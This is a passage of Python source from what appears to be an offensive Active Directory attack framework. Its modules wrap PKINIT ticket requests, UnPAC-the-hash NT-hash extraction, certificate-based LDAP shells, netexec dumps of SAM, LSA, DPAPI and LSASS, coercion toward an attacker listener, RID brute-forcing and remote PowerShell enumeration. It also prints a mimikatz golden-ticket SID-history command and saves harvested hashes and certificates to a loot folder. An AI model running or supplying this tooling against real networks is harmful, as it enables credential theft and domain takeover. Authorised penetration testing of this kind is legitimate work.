                loot_pfx = os.path.join(target.loot_dir, os.path.basename(pfx_file)+'.pfx')
                if not pfx_file.endswith('.pfx') and os.path.exists(pfx_file):
                    import shutil; shutil.copy2(pfx_file, loot_pfx)
                elif os.path.exists(pfx_file):
                    loot_pfx = pfx_file
                log(f'{GREEN}PFX saved: {WHITE}{loot_pfx}{RESET}','success')
                log(f'{GREEN}Password:  {WHITE}{pfx_pass}{RESET}','success')
                # save for pkinit module
                meta_file = os.path.join(target.loot_dir, f'{t_user}_shadow.txt')
                open(meta_file,'w').write(f'pfx={loot_pfx}\npass={pfx_pass}\nuser={t_user}\n')
                log(f'Saved meta → {WHITE}{meta_file}{RESET} (used by pkinit module)','info')
                hr()
                log(f'Next: run {C0}pkinit{RESET} module with target {WHITE}{t_user}{RESET}','info')
        hr()

# =============================================================================
# PKINIT — gettgtpkinit wrapper to get TGT from certificate
# =============================================================================
class PKINIT(Module):
    name='pkinit'; description='gettgtpkinit -- get TGT from PFX certificate (shadow credentials / ADCS cert auth)'; category='lateral'
    def run(self, target):
        if not self.req(target): return
        hr()
        # find gettgtpkinit
        gtp = None
        for p in [os.path.expanduser('~/.segfault-ad/tools/PKINITtools/gettgtpkinit.py'),
                  os.path.expanduser('~/.segfault-ad/tools/PKINITtools/gettgtpkinit.py'),
                  '/opt/PKINITtools/gettgtpkinit.py']:
            if os.path.exists(p): gtp = p; break
        if not gtp:
            log('gettgtpkinit.py not found','error')
            log(f'Install: git clone https://github.com/dirkjanm/PKINITtools ~/.segfault-ad/tools/PKINITtools','info')
            hr(); return

        t_user = self.ask('target user', target.user or '')

        # check for saved shadow cred meta
        meta_file = os.path.join(target.loot_dir, f'{t_user}_shadow.txt')
        default_pfx = ''; default_pass = ''
        if os.path.exists(meta_file):
            for line in open(meta_file):
                if line.startswith('pfx='): default_pfx = line.split('=',1)[1].strip()
                if line.startswith('pass='): default_pass = line.split('=',1)[1].strip()
            log(f'Found shadow cred meta for {WHITE}{t_user}{RESET}','info')

        pfx  = self.ask('PFX file', default_pfx)
        pw   = self.ask('PFX password (blank = no password)', default_pass)
        ccache_out = os.path.join(target.loot_dir, f'{t_user}.ccache')

        if not pfx or not os.path.exists(pfx):
            log(f'PFX file not found: {pfx}','error'); hr(); return

        cmd = ['python3', gtp,
               f'{target.domain}/{t_user}',
               '-cert-pfx', pfx,
               '-dc-ip', target.dc,
               ccache_out]
        if pw: cmd += ['-pfx-pass', pw]

        rc = run_cmd(cmd, label='gettgtpkinit')
        if os.path.exists(ccache_out) and rc == 0:
            os.environ['KRB5CCNAME'] = ccache_out
            env_file = os.path.join(target.loot_dir, 'krb5.env')
            open(env_file,'w').write(f'export KRB5CCNAME={ccache_out}\n')
            log(f'{GREEN}TGT saved → {WHITE}{ccache_out}{RESET}','success')
            log(f'{GREY}Shell: source {env_file}{RESET}','info')
            add_result('tgt', f'{target.user} ccache')
            # offer to run unpac-the-hash
            log(f'Tip: run {C0}unpac{RESET} to extract NT hash from this TGT','info')
        hr()

# =============================================================================
# UNPAC — extract NT hash from PKINIT TGT (unpac-the-hash)
# =============================================================================
class UnPAC(Module):
    name='unpac'; description='getnthash -- extract NT hash from PKINIT TGT (unpac-the-hash, no NTLM needed)'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{C0}UnPAC-the-hash{RESET} — extract NT hash from Kerberos PKINIT TGT','info')
        log(f'Requires a TGT obtained via PKINIT (certificate auth)','info')
        hr()

        # find getnthash
        gnh = None
        for p in [os.path.expanduser('~/.segfault-ad/tools/PKINITtools/getnthash.py'),
                  os.path.expanduser('~/.segfault-ad/tools/PKINITtools/getnthash.py'),
                  '/opt/PKINITtools/getnthash.py']:
            if os.path.exists(p): gnh = p; break
        if not gnh:
            log('getnthash.py not found — part of PKINITtools','error')
            hr(); return

        t_user = self.ask('target user', target.user or '')
        ccache = os.environ.get('KRB5CCNAME','')
        loot_cc = os.path.join(target.loot_dir, f'{t_user}.ccache')
        if not ccache and os.path.exists(loot_cc):
            ccache = loot_cc; os.environ['KRB5CCNAME'] = ccache

        if not ccache or not os.path.exists(ccache):
            log('No TGT/ccache found — run pkinit first','error'); hr(); return

        # get AS-REP key from the TGT (stored during gettgtpkinit)
        key = self.ask('AS-REP key (from gettgtpkinit output)','')

        cmd = ['python3', gnh,
               '-key', key,
               f'{target.domain}/{t_user}',
               '-dc-ip', target.dc]

        rc, lines = run_cmd_capture(cmd, label='getnthash')
        for l in lines:
            if 'Recovered NT Hash' in l or 'NT Hash' in l:
                log(l.strip(),'success')
            elif l.strip():
                print(f'  {GREY}{l.strip()}{RESET}')

        # parse NT hash from output
        nt_hash = None
        for l in lines:
            m = re.search(r'([0-9a-f]{32})', l, re.I)
            if m: nt_hash = m.group(1); break
        if nt_hash:
            log(f'{GREEN}NT hash: {WHITE}{nt_hash}{RESET}','success')
            with open(os.path.join(target.loot_dir,'cracked.txt'),'a') as _f:
                _f.write(f'{t_user}:{nt_hash}\n')
        hr()

# =============================================================================
# LDAPSHELL — certipy ldap-shell via Schannel (NTLM-disabled environments)
# =============================================================================
class LDAPShell(Module):
    name='ldapshell'; description='certipy ldap-shell -- authenticate via TLS client cert (Schannel) for NTLM-disabled DCs'; category='lateral'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{C0}LDAP Shell via Schannel{RESET} — authenticate with certificate over TLS','info')
        log(f'Useful when NTLM is disabled — certificate auth works via LDAPS','info')
        hr()

        t = self.need('certipy','certipy-ad')
        if not t: return

        pfx = self.ask('PFX file','')
        if not pfx or not os.path.exists(pfx):
            # check loot dir for pfx files
            import glob as _gl
            pfx_files = _gl.glob(os.path.join(target.loot_dir,'*.pfx'))
            if pfx_files:
                log(f'PFX files in loot:','info')
                for i,p in enumerate(pfx_files): print(f'  {i+1}  {WHITE}{p}{RESET}')
                choice = self.ask('select','1')
                try: pfx = pfx_files[int(choice)-1]
                except Exception: log('Invalid choice','error'); hr(); return
            else:
                log('No PFX file found — run shadowcred or certipy req first','error'); hr(); return

        log(f'Available commands in ldap-shell:','info')
        print(f'  {GREY}add_user_to_group <user> <group>','info')
        print(f'  set_rbcd <target_computer> <attacker_computer>','info')
        print(f'  get_laps_password <computer>','info')
        print(f'  change_password <user> <password>','info')
        print(f'  whoami{RESET}')
        hr()

        cmd = [t, 'ldap-shell',
               '-u', f'{target.user}@{target.domain}',
               '-dc-ip', target.dc,
               '-pfx', pfx]
        subprocess.call(cmd)
        hr()

# =============================================================================
# CROSSDOMAIN — cross-domain trust attack module
# =============================================================================
class CrossDomain(Module):
    name='crossdomain'; description='cross-domain trust attacks -- SID history, foreign group membership, trust enumeration'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{C0}Cross-Domain Trust Attack{RESET}','info')
        hr()
        action = self.ask('action','enum',['enum','sidhistory','foreigngroups','tickets'])

        nxc = check_tool('netexec','nxc')
        bloody = check_tool('bloodyad','bloodyAD')

        if action == 'enum':
            log('Enumerating domain trusts...','info')
            if nxc:
                run_cmd(nxc_auth_cmd(nxc, 'ldap', target) + ['--trusted-for-delegation'],
                        label='trust enum')
            # check with bloodyad
            if bloody:
                run_cmd([bloody]+target.bloodyad_args()+['get','object',
                    f'CN=System,DC={",DC=".join(target.domain.split("."))}',
                    '--attr','trustType,trustDirection,trustAttributes,flatName',
                    '--filter','(objectClass=trustedDomain)'],
                    label='trust objects')

        elif action == 'foreigngroups':
            log('Finding foreign group memberships (users from other domains in local groups)...','info')
            if nxc:
                run_cmd(nxc_auth_cmd(nxc,'ldap',target)+['--groups'], label='groups')
            log(f'Tip: foreign SIDs in groups appear as S-1-5-21-<other_domain>-<RID>','info')

        elif action == 'sidhistory':
            target_domain = self.ask('target domain (the one to abuse)')
            log(f'SID History attack — inject {WHITE}{target_domain}{RESET} admin SID into TGT','info')
            log(f'Requires DA on current domain to perform golden/diamond ticket','info')
            hr()
            print(f'  {WHITE}mimikatz: kerberos::golden /user:admin /domain:{target.domain}')
            print(f'            /sid:<current_domain_sid> /sids:<target_DA_sid>')
            print(f'            /krbtgt:<hash> /ptt{RESET}')

        elif action == 'tickets':
            log('Listing all ccache tickets in loot...','info')
            import glob as _gl
            ccaches = _gl.glob(os.path.join(target.loot_dir,'*.ccache'))
            if ccaches:
                for cc in ccaches:
                    print(f'  {WHITE}{cc}{RESET}')
                    try:
                        out = subprocess.check_output(['impacket-describeTicket',cc],
                            text=True, stderr=subprocess.DEVNULL, timeout=5)
                        for l in out.splitlines():
                            if any(x in l for x in ['Principal','Realm','Valid','Service']):
                                print(f'    {GREY}{l.strip()}{RESET}')
                    except Exception: pass
            else:
                log('No ccache files in loot','info')
        hr()

def nxc_auth_cmd(nxc, proto, target):
    """Helper: build netexec auth command."""
    ccache = os.environ.get('KRB5CCNAME','')
    host = target.dc_fqdn or target.dc
    if ccache and os.path.exists(ccache):
        return [nxc, proto, host, '-k', '--use-kcache', '-u', target.user or '']
    elif target.hash:
        return [nxc, proto, host, '-u', target.user, '-H', target.hash, '-d', target.domain]
    elif target.password:
        return [nxc, proto, host, '-u', target.user, '-p', target.password, '-d', target.domain]
    return [nxc, proto, host]


class NXCModules(Module):
    name='nxcmodules'; description='netexec module battery — spider_plus, loggedon, sessions, pass-pol, rid, users, wmi, sam, lsa, dpapi, procdump, coerce_plus, enum_av'; category='recon'
    def run(self, target):
        if not self.req(target): return
        nxc = self.need('netexec','nxc','crackmapexec','cme')
        if not nxc: return
        hr()
        action = self.ask('action','menu',[
            'menu','loggedon','sessions','pass-pol','rid','users',
            'spider_plus','wmi','sam','lsa','dpapi','procdump',
            'enum_av','coerce_plus','all_recon'])
        t_host = self.ask('target', target.dc_fqdn or target.dc)
        hr()

        ccache  = os.environ.get('KRB5CCNAME','')
        use_krb = ccache and os.path.exists(ccache)
        # build auth-only args (no host)
        if use_krb:
            _auth = ['-k','--use-kcache','-u',target.user or '']
        elif target.user and (target.password or target.hash):
            _auth = ['-u',target.user,'-d',target.domain or 'WORKGROUP']
            if target.hash:       _auth += ['-H',target.hash]
            elif target.password: _auth += ['-p',target.password]
        else:
            # try null session first
            _null_test = run_cmd_capture([nxc,'smb',t_host,'-u','','-p','','--shares'],
                                         label='null session test')[1]
            if any('ACCESS_DENIED' in l or 'SESSION_DELETED' in l or 'ACCOUNT_DISABLED' in l
                   for l in _null_test):
                log(f'{ORANGE}Null session denied — trying guest{RESET}','warn')
                _auth = ['-u','guest','-p','']
            else:
                _auth = ['-u','','-p','']
        nxc_smb  = [nxc,'smb', t_host]+_auth
        nxc_ldap = [nxc,'ldap',t_host]+_auth
        nxc_wmi  = [nxc,'wmi', t_host]+_auth

        if action == 'menu':
            print(f'\n  {C0}Available actions:{RESET}')
            items = [
                ('loggedon',   'who is logged on right now (SMB)'),
                ('sessions',   'active SMB sessions on target'),
                ('pass-pol',   'password policy — lockout threshold, complexity'),
                ('rid',        'RID brute-force user enumeration'),
                ('users',      'enumerate domain users via LDAP'),
                ('spider_plus','smart spider: maps all shares + downloads interesting files'),
                ('wmi',        'WMI query — OS info, processes, services'),
                ('sam',        'dump SAM hashes (local admin required)'),
                ('lsa',        'dump LSA secrets (local admin required)'),
                ('dpapi',      'dump DPAPI masterkeys + decrypt (domain or local)'),
                ('procdump',   'dump LSASS via procdump (local admin required)'),
                ('enum_av',    'detect AV/EDR products running on host'),
                ('coerce_plus','MS-EFSR coerce via nxc module'),
                ('all_recon',  'run loggedon + sessions + pass-pol + users in sequence'),
            ]
            for name,desc in items:
                print(f'  {C0}{name:<14}{RESET}  {GREY}{desc}{RESET}')
            hr(); return

        elif action == 'loggedon':
            log('Who is logged on right now','info')
            run_cmd(nxc_smb+['--loggedon-users'], label='nxc loggedon-users')
            add_result('nxcmodules','loggedon-users enumerated')

        elif action == 'sessions':
            log('Active SMB sessions on target','info')
            run_cmd(nxc_smb+['--sessions'], label='nxc sessions')

        elif action == 'pass-pol':
            log('Password policy — lockout threshold, min length, complexity','info')
            run_cmd(nxc_smb+['--pass-pol'], label='nxc pass-pol')
            add_result('nxcmodules','password policy retrieved')

        elif action == 'rid':
            log('RID brute-force user enumeration','info')
            end = self.ask('max RID','2000')
            rc, lines = run_cmd_capture(nxc_smb+['--rid-brute', end], label='nxc rid-brute')
            # save users to loot
            users = []
            for l in lines:
                if 'SidTypeUser' in l and '\\' in l:
                    m = re.search(r'\d+:\s+\S+\\(\S+)\s+\(SidTypeUser\)', l)
                    if m: users.append(m.group(1))
            if users:
                ufile = os.path.join(target.loot_dir, 'users.txt')
                with open(ufile,'w') as f: f.write('\n'.join(users)+'\n')
                log(f'{GREEN}{len(users)} users saved → {WHITE}{ufile}{RESET}','success')
                for u in users: print(f'  {C0}{u}{RESET}')
            add_result('nxcmodules','RID brute complete')

        elif action == 'users':
            log('Enumerate domain users via LDAP','info')
            rc, lines = run_cmd_capture(nxc_ldap+['--users'], label='nxc ldap users')
            add_result('nxcmodules','users enumerated')
            _scan_descriptions(lines, target.loot_dir, target.domain or '')

        elif action == 'spider_plus':
            log('spider_plus — maps all shares and downloads interesting files','info')
            log(f'{ORANGE}Use shares → auto for full auto-download; spider_plus gives raw map{RESET}','info')
            out_dir = os.path.join(target.loot_dir,'spider_plus')
            os.makedirs(out_dir, exist_ok=True)
            run_cmd(nxc_smb+['-M','spider_plus','-o',f'OUTPUT_FOLDER={out_dir}'],
                    label='nxc spider_plus')
            # parse output json if present
            import glob as _gl_sp
            jsons = _gl_sp.glob(os.path.join(out_dir,'*.json'))
            if jsons:
                try:
                    import json as _json_sp
                    data = _json_sp.loads(open(jsons[0]).read())
                    total = sum(len(v) for v in data.values())
                    log(f'{GREEN}{total} file(s) mapped across {len(data)} share(s){RESET}','success')
                    # flag interesting ones
                    INTERESTING = {'.xlsx','.kdbx','.pfx','.ppk','.config','.cfg','.ini','.env'}
                    for share, files in data.items():
                        for f in files:
                            ext = os.path.splitext(f.lower())[1]
                            if ext in INTERESTING:
                                log(f'{PINK}→ {share}\\{f}{RESET}','warn')
                except Exception:
                    pass
                add_result('nxcmodules',f'spider_plus: {os.path.basename(jsons[0])}')
            log(f'Full map: {WHITE}{out_dir}{RESET}','info')

        elif action == 'wmi':
            log('WMI query','info')
            query = self.ask('WMI query','SELECT Caption,Version,OSArchitecture FROM Win32_OperatingSystem')
            ns    = self.ask('namespace','//./root/cimv2')
            run_cmd(nxc_wmi+['--wmi',query,'--wmi-namespace',ns], label='nxc wmi')

        elif action == 'sam':
            log('Dump SAM hashes — requires local admin','info')
            log(f'{ORANGE}This is noisy — creates VSS shadow copy{RESET}','warn')
            run_cmd(nxc_smb+['--sam'], label='nxc sam dump')
            add_result('nxcmodules','SAM dumped')

        elif action == 'lsa':
            log('Dump LSA secrets — requires local admin','info')
            run_cmd(nxc_smb+['--lsa'], label='nxc lsa dump')
            add_result('nxcmodules','LSA secrets dumped')

        elif action == 'dpapi':
            log('DPAPI masterkeys + secrets','info')
            mode2 = self.ask('mode','masterkeys',['masterkeys','credentials','browser','backupkey'])
            if mode2 == 'masterkeys':
                run_cmd(nxc_smb+['-M','dpapi','-o','ACTION=masterkeys'], label='nxc dpapi masterkeys')
            elif mode2 == 'credentials':
                run_cmd(nxc_smb+['-M','dpapi','-o','ACTION=credentials'], label='nxc dpapi creds')
            elif mode2 == 'browser':
                run_cmd(nxc_smb+['-M','dpapi','-o','ACTION=browser'], label='nxc dpapi browser')
            elif mode2 == 'backupkey':
                run_cmd(nxc_ldap+['-M','dpapi','-o','ACTION=backupkey'], label='nxc dpapi backupkey')
            add_result('nxcmodules',f'dpapi {mode2}')

        elif action == 'procdump':
            log('Dump LSASS via procdump — requires local admin + procdump on target','info')
            log(f'{ORANGE}Likely to trigger AV/EDR — use with caution{RESET}','warn')
            run_cmd(nxc_smb+['-M','procdump'], label='nxc procdump')
            add_result('nxcmodules','procdump LSASS')

        elif action == 'enum_av':
            log('Detect AV/EDR products on target','info')
            run_cmd(nxc_smb+['-M','enum_av'], label='nxc enum_av')
            add_result('nxcmodules','AV/EDR enumerated')

        elif action == 'coerce_plus':
            log('MS-EFSR coercion via nxc module','info')
            listener = self.ask('your listener IP')
            run_cmd(nxc_smb+['-M','coerce_plus','-o',f'LISTENER={listener}'],
                    label='nxc coerce_plus')
            add_result('nxcmodules',f'coerce_plus → {listener}')

        elif action == 'all_recon':
            log('Running full recon battery: loggedon + sessions + pass-pol + users','info')
            hr()
            run_cmd(nxc_smb+['--loggedon-users'], label='loggedon-users')
            run_cmd(nxc_smb+['--sessions'],        label='sessions')
            run_cmd(nxc_smb+['--pass-pol'],        label='pass-pol')
            run_cmd(nxc_ldap+['--users'],          label='ldap users')
            add_result('nxcmodules','full recon battery complete')
        hr()


class NetEnum(Module):
    name='netenum'; description='Windows network enum — interfaces, routes, ARP, ports, connections, live host discovery via netexec/PowerShell'; category='recon'
    def run(self, target):
        import re as _re_ne, subprocess as _sp
        hr()
        log(f'{C0}NetEnum{RESET} — Windows network enumeration via {WHITE}{target.user or "current"}{RESET}','info')

        # choose exec method: netexec winrm (interactive) or impacket-wmiexec (command)
        nxc = check_tool('netexec','nxc')
        dc_host = target.dc_fqdn or target.dc

        def _run_ps(ps_cmd, label=''):
            """Run PowerShell command on target via netexec winrm -x."""
            if not nxc or not (target.password or target.hash):
                return ''
            try:
                if target.password:
                    cmd = [nxc,'winrm',dc_host,'-u',target.user,'-p',target.password,
                           '-x',f'powershell -c "{ps_cmd}"']
                else:
                    cmd = [nxc,'winrm',dc_host,'-u',target.user,'-H',target.hash,
                           '-x',f'powershell -c "{ps_cmd}"']
                out = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL, timeout=20)
                # strip netexec prefix lines like "WINRM 10.x.x.x 5985 HOST [+]..."
                lines = [l for l in out.splitlines()
                         if not re.match(r'WINRM\s+\d+\.\d+',l) and l.strip()]
                return '\n'.join(lines)
            except Exception as e:
                log(f'{label} failed: {e}','warn'); return ''

        def _box(title, rows):
            if not rows: return
            print(f'\n  {C0}{BOLD}{title}{RESET}')
            for k,v in rows.items():
                print(f'    {WHITE}{str(k):<35}{RESET}  {GREY}{v}{RESET}')

        # ── interfaces ──────────────────────────────────────────────────────
        log('Enumerating interfaces...','info')
        raw = _run_ps('Get-NetIPAddress | Select-Object InterfaceAlias,AddressFamily,IPAddress,PrefixLength | Format-Table -AutoSize', 'interfaces')
        ifaces = {}
        for line in raw.splitlines():
            m = re.match(r'(\S+)\s+(\S+)\s+(\S+)\s+(\d+)', line.strip())
            if m and 'IPv' in m.group(2):
                ifaces[f'{m.group(1)} ({m.group(2)})'] = f'{m.group(3)}/{m.group(4)}'
        _box('Network Interfaces', ifaces)

        # ── routes ──────────────────────────────────────────────────────────
        log('Fetching routing table...','info')
        raw = _run_ps('Get-NetRoute -AddressFamily IPv4 | Where DestinationPrefix -ne "255.255.255.255/32" | Select DestinationPrefix,NextHop,RouteMetric,InterfaceAlias | Format-Table -AutoSize', 'routes')
        routes = {}
        for line in raw.splitlines():
            m = re.match(r'(\S+)\s+(\S+)\s+(\d+)\s+(\S+)', line.strip())
            if m: routes[m.group(1)] = f'via {m.group(2)} metric {m.group(3)} ({m.group(4)})'
        _box('Routes', routes)

        # ── ARP table ────────────────────────────────────────────────────────
        log('Reading ARP table...','info')
        raw = _run_ps('Get-NetNeighbor -AddressFamily IPv4 | Where State -ne "Unreachable" | Select IPAddress,LinkLayerAddress,State,InterfaceAlias | Format-Table -AutoSize', 'arp')
        arp = {}
        for line in raw.splitlines():
            m = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9A-Fa-f-]{17})\s+(\S+)\s+(\S+)', line.strip())
            if m: arp[m.group(1)] = f'{m.group(2).replace("-",":")} [{m.group(3)}] {m.group(4)}'
        _box('ARP Table', arp)

        # ── listening ports ──────────────────────────────────────────────────
        log('Listing listening ports...','info')
        raw = _run_ps('Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,@{N="Process";E={(Get-Process -Id $_.OwningProcess -EA 0).Name}} | Sort LocalPort | Format-Table -AutoSize', 'ports')
        ports = {}
        for line in raw.splitlines():
            m = re.match(r'(\S+)\s+(\d+)\s+(\S*)', line.strip())
            if m: ports[f'{m.group(1)}:{m.group(2)}'] = m.group(3) or '-'
        _box('Listening Ports', ports)

        # ── established connections ──────────────────────────────────────────
        log('Listing established connections...','info')
        raw = _run_ps('Get-NetTCPConnection -State Established | Select LocalAddress,LocalPort,RemoteAddress,RemotePort,@{N="Proc";E={(Get-Process -Id $_.OwningProcess -EA 0).Name}} | Format-Table -AutoSize', 'connections')
        conns = {}
        for line in raw.splitlines():
            m = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\S*)', line.strip())
            if m: conns[f'{m.group(1)}:{m.group(2)} → {m.group(3)}:{m.group(4)}'] = m.group(5) or '-'
        _box('Established Connections', conns)

        # ── DNS servers ──────────────────────────────────────────────────────
        log('Reading DNS config...','info')
        raw = _run_ps('Get-DnsClientServerAddress -AddressFamily IPv4 | Select InterfaceAlias,ServerAddresses | Format-Table -AutoSize', 'dns')
        dns = {}
        for line in raw.splitlines():
            m = re.match(r'(\S+)\s+({.+}|\d+\.\S+)', line.strip())
            if m: dns[m.group(1)] = m.group(2)
        _box('DNS Servers', dns)

        # ── live host discovery ──────────────────────────────────────────────
        subnet = self.ask('subnet to scan (e.g. 10.10.10.0/24, blank = skip)', '')
        if not subnet:
            print(); hr(); return

        log(f'Scanning {WHITE}{subnet}{RESET} for live hosts via Test-Connection...','info')
        ps_scan = (
            f'$net="{subnet}";'
            f'$base=($net -split "/")[0] -replace "\\.\\d+$","";'
            f'1..254 | ForEach-Object {{'
            f'  $ip="$base.$_";'
            f'  if(Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1){{'
            f'    Write-Host $ip'
            f'  }}'
            f'}}'
        )
        raw = _run_ps(ps_scan, 'host discovery')
        live = [l.strip() for l in raw.splitlines() if re.match(r'\d+\.\d+\.\d+\.\d+', l.strip())]
        if live:
            print(f'\n  {C0}{BOLD}Live hosts — {subnet} ({len(live)} up){RESET}')
            for ip in sorted(live):
                print(f'    {GREEN}{ip}{RESET}')
            loot_f = os.path.join(target.loot_dir, 'netenum_hosts.txt')
            with open(loot_f,'w') as _f: _f.write('\n'.join(sorted(live))+'\n')
            log(f'Saved to {WHITE}{loot_f}{RESET}','success')
        else:
            log(f'No live hosts found on {subnet}','warn')

        print(); hr()



class OwnerEdit(Module):
    name='owneredit'; description='impacket-owneredit — take ownership of AD object (required before dacledit)'; category='exploitation'
    def run(self, target):
        hr()
        tool = check_tool('impacket-owneredit','owneredit.py')
        if not tool: log('impacket-owneredit not found','error'); return
        new_owner = self.ask('new owner (principal)', target.user or '')
        obj       = self.ask('target object (user/group/computer)', '')
        if not obj: log('target required','error'); return
        dc = target.dc_fqdn or target.dc
        if target.hash:
            auth = [f'{target.domain}/{target.user}','-hashes',f':{target.hash}']
        else:
            auth = [f'{target.domain}/{target.user}:{target.password}']
        cmd = [tool,'-action','write','-new-owner',new_owner,'-target',obj,'-dc-ip',target.dc] + auth
        log(f'owneredit','info'); log(f'{" ".join(cmd)}','info')
        hr()
        result = subprocess.run(cmd, text=True)
        hr()
class PassiveSniff(Module):
    name='passivesniff'; description='passive tcpdump sniff — detect WPAD/LLMNR/DHCPv6/WSUS/PXE, auto-identify DCs from Kerberos/LDAP/SMB traffic'; category='recon'
    def run(self, target):
        import re as _re_ps, subprocess as _sp, shutil as _sh, time as _ti
        hr()
        iface = self.ask('interface', 'eth0')
        duration = int(self.ask('sniff duration seconds', '30'))
        log(f'{C0}passive sniff{RESET} on {WHITE}{iface}{RESET} for {WHITE}{duration}s{RESET}','info')

        if not _sh.which('tcpdump'):
            log('tcpdump not found — sudo apt install tcpdump','error'); return

        bpf = ('udp port 5355 or '   # LLMNR
               'udp port 5353 or '   # mDNS
               'udp port 547  or '   # DHCPv6
               'tcp port 8530 or '   # WSUS HTTP
               'tcp port 8531 or '   # WSUS HTTPS
               'udp port 53   or '   # DNS
               'udp port 137  or '   # NBT-NS
               'udp port 67   or '   # DHCP PXE
               'udp port 69   or '   # TFTP
               'tcp port 88   or '   # Kerberos
               'udp port 88   or '   # Kerberos UDP
               'tcp port 389  or '   # LDAP
               'tcp port 636  or '   # LDAPS
               'tcp port 445'        # SMB
        )

        cap_f = os.path.join(target.loot_dir, 'passive_sniff.txt')
        log(f'Capturing for {WHITE}{duration}s{RESET}... (Ctrl+C to stop early)','info')
        try:
            proc = subprocess.Popen(['tcpdump','-i',iface,'-n','-l',bpf],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            lines = []; t0 = _ti.time()
            while _ti.time()-t0 < duration:
                line = proc.stdout.readline()
                if line: lines.append(line.rstrip())
            proc.terminate(); proc.wait()
        except KeyboardInterrupt:
            proc.terminate(); proc.wait()
            log('Stopped early','warn')

        content = '\n'.join(lines)
        with open(cap_f,'w') as _f: _f.write(content)

        results = {
            'llmnr':  set(), 'dhcpv6': set(), 'wsus':   set(),
            'wpad_dns':set(), 'nbtns': set(), 'pxe':    set(),
            'tftp':   set(), 'dcs':   {},      'domains':set(),
        }

        AD_PORTS = {'88':'Kerberos','389':'LDAP','636':'LDAPS','445':'SMB'}

        for line in lines:
            # source IP
            m_src = re.match(r'[\d:.]+ IP6? ([\d.]+)\.', line)
            src = m_src.group(1) if m_src else ''

            if '.5355' in line and src:  results['llmnr'].add(src)
            if '.547'  in line and src:  results['dhcpv6'].add(src)
            if ('.8530' in line or '.8531' in line) and src: results['wsus'].add(src)
            if '53' in line and 'wpad' in line.lower() and src: results['wpad_dns'].add(src)
            if '.137' in line and src:  results['nbtns'].add(src)
            if ('.67'  in line or '.68' in line) and any(x in line.lower() for x in ['pxe','boot','wds']): results['pxe'].add(src)
            if '.69'  in line and src:  results['tftp'].add(src)

            # DC fingerprinting from AD ports
            ep = re.match(r'[\d:.]+ IP6? ([\d.]+)\.(\d+) > ([\d.]+)\.(\d+)', line)
            if ep:
                s_ip,s_port,d_ip,d_port = ep.groups()
                if s_port in AD_PORTS: results['dcs'].setdefault(s_ip, set()).add(AD_PORTS[s_port])
                if d_port in AD_PORTS: results['dcs'].setdefault(d_ip, set()).add(AD_PORTS[d_port])

            # domain names from msdcs SRV queries
            m_dom = re.search(r'dc\._msdcs\.([\w.-]+)', line, re.I)
            if m_dom: results['domains'].add(m_dom.group(1).lower().rstrip('.'))

        # report
        found = False
        for key,label,icon in [
            ('llmnr',  'LLMNR queries',   '📡'),
            ('dhcpv6', 'DHCPv6 solicit',  '🔌'),
            ('wsus',   'WSUS traffic',    '📦'),
            ('wpad_dns','WPAD DNS',       '🌐'),
            ('nbtns',  'NBT-NS WPAD',    '📡'),
            ('pxe',    'PXE boot',        '🖥 '),
            ('tftp',   'TFTP transfers',  '📂'),
        ]:
            if results[key]:
                log(f'{icon} {label}: {GREEN}{len(results[key])} host(s){RESET}','success')
                for ip in sorted(results[key]): print(f'    {GREY}{ip}{RESET}')
                found = True

        if results['dcs']:
            ranked = sorted(results['dcs'].items(), key=lambda kv: (-len(kv[1]),kv[0]))
            log(f'🏛  DC candidates: {GREEN}{len(ranked)}{RESET}','success')
            for ip,svcs in ranked:
                print(f'    {WHITE}{ip:<18}{RESET}  {GREY}{", ".join(sorted(svcs))}{RESET}')
            # auto-fill DC if not set
            if not target.dc:
                for ip,svcs in ranked:
                    if {'Kerberos','LDAP','LDAPS'} & svcs:
                        target.dc = ip
                        log(f'Auto-set DC IP → {WHITE}{ip}{RESET}','success')
                        break
            found = True

        if results['domains']:
            log(f'🏢 Domains detected:','success')
            for d in sorted(results['domains']): print(f'    {GREY}{d}{RESET}')
            if not target.domain:
                target.domain = sorted(results['domains'])[0]
                log(f'Auto-set domain → {WHITE}{target.domain}{RESET}','success')
            found = True

        if not found:
            log(f'No interesting traffic in {duration}s — clients may not have queried yet','warn')

        log(f'Saved to {WHITE}{cap_f}{RESET}','info')
        hr()


class Enrich(Module):
    name='enrich'; description='post-auth nxc battery — laps, pre2k, maq, get-desc-users, nopac, timeroast, badsuccessor, gpp_autologin'; category='recon'
    def run(self, target):
        hr()
        if not target.user:
            log('Username required for enrich','error'); return

        nxc = check_tool('netexec','nxc','crackmapexec','cme')
        if not nxc:
            log('netexec not found','error'); return

        dc = target.dc_fqdn or target.dc
        if not dc:
            log('DC not set','error'); return

        # build auth args
        def _auth(proto):
            if target.hash:
                return [nxc,proto,dc,'-u',target.user,'-H',target.hash,'-d',target.domain]
            elif target.password:
                return [nxc,proto,dc,'-u',target.user,'-p',target.password,'-d',target.domain]
            else:
                # try ccache
                return [nxc,proto,dc,'-u',target.user,'--use-kcache','-k']

        # (label, proto, module, extra_args, description)
        _local_modules = [
            ('maq',          'ldap', 'maq',            [],         'MachineAccountQuota — RBCD viability'),
            ('laps',         'ldap', 'laps',           [],         'LAPS admin passwords'),
            ('pre2k',        'ldap', 'pre2k',          [],         'pre-2000 default-password computer accounts'),
            ('get-desc-users','ldap','get-desc-users',[],          'user descriptions — password mining'),
            ('gpp_autologin','smb',  'gpp_autologin', [],         'GPP autologon credentials'),
            ('nopac',        'smb',  'nopac',          [],         'CVE-2021-42278 sAMAccountName spoof check'),
            ('timeroast',    'smb',  'timeroast',      [],         'NTP-based hash extraction'),
            ('badsuccessor', 'ldap', 'badsuccessor',   [],         'dMSA bad successor (2024)'),
            ('ntdsutil',     'smb',  'ntdsutil',       [],         'ntdsutil snapshot check'),
        ]

        print(f'\n  {C0}{BOLD}enrich{RESET}  {GREY}post-auth nxc module battery{RESET}\n')
        hits_total = 0
        hits_lock  = threading.Lock()

        def _run_module(label, proto, module, extra, desc):
